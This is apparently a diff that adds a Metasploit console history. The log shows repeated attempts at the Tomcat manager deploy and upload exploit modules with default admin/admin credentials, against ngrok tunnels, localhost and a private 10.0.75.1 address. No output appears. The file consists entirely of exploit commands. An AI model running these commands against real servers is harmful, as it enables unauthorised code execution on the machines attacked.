@@ -1,0 +1,105 @@
+use exploit/multi/http/tomcat_mgr_deploy
+set RHOST http://854b6902.ngrok.io
+set RHOST 854b6902.ngrok.io
+set RPORT 80
+set USERNAME admin
+set PASSWORD admin
+set PATH /manager/html
+exploit
+exploit
+set RHOST 127.0.0.1
+exploit
+set RHOST 854b6902.ngrok.io
+exploit
+set USERNAME admina
+exploit
+show targets
+set TARGET 1
+exploit
+use exploit/multi/http/tomcat_mgr_upload
+exploit
+set RHOST 854b6902.ngrok.io
+set USERNAME admin
+set PASSWORD admin
+set RPORT 80
+set PATH /manager/html
+exploit
+set TARGET 1
+exploit
+set TARGET 3
+exploit
+set TARGET 2
+exploit
+set TARGET 0
+exploit
+set RHOST 127.0.0.1
+exploit
+exploit
+set RHOST localhost
+exploit
+set RHOST 10.0.75.1
+exploit
+set RHOST 10.0.75.1
+set RPORT 8081
+exploit
+set RHOST 94a20328.ngrok.io
+set RPORT 80
+exploit
+exit
+use exploit/multi/http/tomcat_mgr_upload
+exploit
+set RHOST 94a20328.ngrok.io
+set USERNAME admin
+set PASSWORD a
+exploit
+set PASSWORD admin
+exploit
+set PATH /manager/html
+exploit
+set PATH /manager/html/
+exploit
+exploit
+exploit
+set username admin
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exit
+use exploit/multi/http/tomcat_mgr_upload
+set RHOST localhost
+set RPORT 8080
+set USERNAME admin
+set PASSWORD admin
+set PATH /manager/html
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+exploit
+set RHOST 127.0.0.1
+exploit
+exploit
+exploit
+set LHOST 127.0.0.4
+exploit
+exploit
+show targets
+set TARGET 2
+exploit
+exploit
+set TARGET 0
+exploit
+exploit
+exploit
+set username admin
+exploit
+exploit
+set password admin
+exploit
+exploit
+exploit
